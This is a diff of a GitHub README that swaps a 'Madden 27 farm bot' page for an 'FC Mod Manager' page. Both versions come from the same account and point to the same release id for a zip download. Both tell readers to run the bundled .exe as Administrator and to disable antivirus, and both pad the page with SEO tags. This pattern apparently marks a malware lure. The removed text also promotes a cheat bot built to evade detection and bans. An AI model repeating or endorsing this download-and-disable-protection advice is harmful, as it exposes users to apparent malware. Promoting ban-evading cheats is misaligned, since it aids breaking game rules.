@@ -1,33 +1,61 @@
-# 🏈 Madden-27-Farm-Bot
+# ⚽ FC-Mod-Manager
 
-*Automated farming bot for Madden NFL 27 Ultimate Team (MUT)*
+*Complete mod management for EA Sports FC 26, FC 25, FC 24 & FIFA 19-23*
 
-<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/6e425d25-2b02-4bef-9ead-9185976e3704" />
+<img width="448" height="448" alt="image" src="https://github.com/user-attachments/assets/0ada879b-b313-4212-b2f9-54abf87fbeb1" />
 
 ---
 
 ## 🎮 What is This?
 
-**Madden-27-Farm-Bot** is an automated farming bot for **Madden NFL 27 Ultimate Team (MUT)**. It helps you farm coins, complete solo challenges, trade cards, and manage your auction house. Perfect for players who want to build their dream team without spending real money.
+**FC-Mod-Manager** is a complete mod management solution for **EA Sports FC 26, FC 25, FC 24** and all **FIFA** games from FIFA 19 to FIFA 23. It supports .fifamod and .fbmod files, providing drag & drop import, load order control, conflict detection, and BepInEx integration. Perfect for enhancing graphics, kits, faces, stadiums, gameplay, and career mode.
 
 ## 📥 Download
 
-**[Download Madden-27-Farm-Bot](https://github.com/Openoolead99/Madden-27-Farm-Bot/releases/download/765765/Madden-27-Farm-Bot.zip)**
-
+**[Download FC-Mod-Manager](https://github.com/Openoolead99/FC-Mod-Manager/releases/download/765765/FCModManager.zip)**
 ---
 
 ## ✨ Features
 
-- **Solo Challenge Automation** – Auto-play solo challenges for coins and rewards
-- **Auction House Helper** – Auto-buy low, sell high with custom filters
-- **Card Trading** – Auto-trade cards for profit
-- **Coin Farming** – Accumulate MUT 27 Coins effortlessly
-- **Goal Completion** – Auto-complete daily and weekly goals
-- **Anti-AFK Detection** – Simulates human behavior to avoid detection
-- **User-Friendly GUI** – Easy to configure with simple interface
-- **Multi-Account Support** – Run multiple accounts simultaneously
-- **Customizable Settings** – Adjust farming speed and strategies
-- **Auto-Update** – Always compatible with the latest game patch
+- **Drag & Drop Import** – Add .fifamod and .fbmod files instantly
+- **Load Order Control** – Organize mods to avoid conflicts
+- **Conflict Detection** – Automatically detects overlapping files
+- **Restore Points** – One-click rollback to previous states
+- **Mod Store Browser** – Browse and install mods from trusted repositories
+- **BepInEx Manager** – One-click BepInEx installation and configuration
+- **Preset Loader** – Load reusable mod presets easily
+- **Profile Management** – Save and load different mod configurations
+- **Live Editor Integration** – Real-time memory editing for Career Mode
+- **Players Editor** – Edit attributes, appearance, playstyles
+- **Teams Editor** – Edit league table, transfer budget, formation, starting XI
+- **Database Editor** – LUA API for programmatic interaction
+
+---
+
+## 🎮 Supported Games
+
+| Game | Status |
+|------|--------|
+| EA Sports FC 26 | ✅ Full Support |
+| EA Sports FC 25 | ✅ Full Support |
+| EA Sports FC 24 | ✅ Full Support |
+| FIFA 23 | ✅ Full Support |
+| FIFA 22 | ✅ Full Support |
+| FIFA 21 | ✅ Full Support |
+| FIFA 20 | ✅ Full Support |
+| FIFA 19 | ✅ Full Support |
+
+---
+
+## 🎯 Supported Mod Types
+
+| Mod Type | Description |
+|----------|-------------|
+| Gameplay Mods | Ball physics, AI, speed, injuries |
+| Career Mode Mods | Career overhaul, transfers, budgets |
+| Visual Mods | Faces, kits, minifaces, banners |
+| Scoreboard Mods | Custom scoreboard designs |
+| Database Mods | Team name fixes, leagues, transfers |
 
 ---
 
@@ -35,10 +63,10 @@
 
 1. Click the download button above
 2. Extract the archive
-3. Run `Madden27FarmBot.exe` as Administrator
-4. Configure your settings (cooldowns, filters, actions)
-5. Launch Madden NFL 27
-6. Click Start and let the bot do the work!
+3. Run `FC-Mod-Manager.exe` as Administrator
+4. Select your game (FC 26/25/24 or FIFA 19-23)
+5. Drag & drop your mods or browse the Mod Store
+6. Click Apply and launch the game
 
 ---
 
@@ -47,34 +75,10 @@
 | Requirement | Details |
 |-------------|---------|
 | **OS** | Windows 10/11 (64-bit) |
-| **Game** | Madden NFL 27 (Steam / EA App) |
+| **Game** | EA Sports FC 24-26 / FIFA 19-23 |
 | **RAM** | 4GB minimum |
-| **Storage** | 50MB free space |
-| **Internet** | Required |
-
----
-
-## 🔧 Features Table
-
-| Category | Feature | Status |
-|----------|---------|--------|
-| Farming | Solo Challenges | ✅ |
-| Farming | Coin Accumulation | ✅ |
-| Trading | Auction House Auto-Trade | ✅ |
-| Trading | Card Trading | ✅ |
-| Utility | Goal Completion | ✅ |
-| Utility | Multi-Account | ✅ |
-| Utility | Anti-AFK | ✅ |
-| Utility | Auto-Update | ✅ |
-
----
-
-## ⚠️ Important Notes
-
-- **Use a throwaway account** – EA actively bans farm bots
-- **Set realistic cooldowns** – Avoid unrealistic gameplay patterns
-- **Keep the bot updated** – Updates maintain stability
-- **Use solo challenges** – Less risk than online modes
+| **Storage** | 100MB free space |
+| **.NET** | 6.0+ |
 
 ---
 
@@ -82,15 +86,16 @@
 
 | Issue | Solution |
 |-------|----------|
-| Bot doesn't work | Run as Administrator, disable antivirus |
-| Bot detected | Use more realistic cooldowns, update bot |
-| Game crashes | Reduce graphics settings, disable overlays |
+| Mod manager doesn't work | Run as Administrator, disable antivirus temporarily |
+| Mods don't load in game | Check load order, ensure mods are compatible |
+| Game crashes with mods | Try disabling mods one by one, use restore point |
+| Anti-cheat (EAAC) blocks mods | Use offline mode for single-player mods, remove mods before going online |
 
 ---
 
 ## 📝 SEO Tags
 
-madden 27 farm bot, madden 27 coin farm, madden 27 mut coins, madden nfl 27 bot, madden 27 solo challenge bot, madden 27 auction house bot, madden 27 cheat, madden 27 trainer, madden 27 utility, madden 27 enhancement, ea sports madden bot, madden 27 money farm, madden 27 coin generator, madden 27 autofarm, madden 27 farming tool
+fc mod manager, fifa mod manager, ea sports fc mods, fc26 mods, fifa modding, fc25 mods, fc24 mods, fifa 23 mods, fifa 22 mods, fifa mod loader, fifa mod organizer, fifa mod installer, fifa mod presets, fc mod store, fc modding tool, fifa live editor, fifa career mode mods, fifa gameplay mods, fifa visual mods, fifa face mods, fifa kit mods, fifa scoreboard mods, fifa database editor, bepinex fifa, frosty mod manager, fifa mod manager 2026, fc26 mod manager, ea fc mods, fifa 26 mods
 
 ---
 
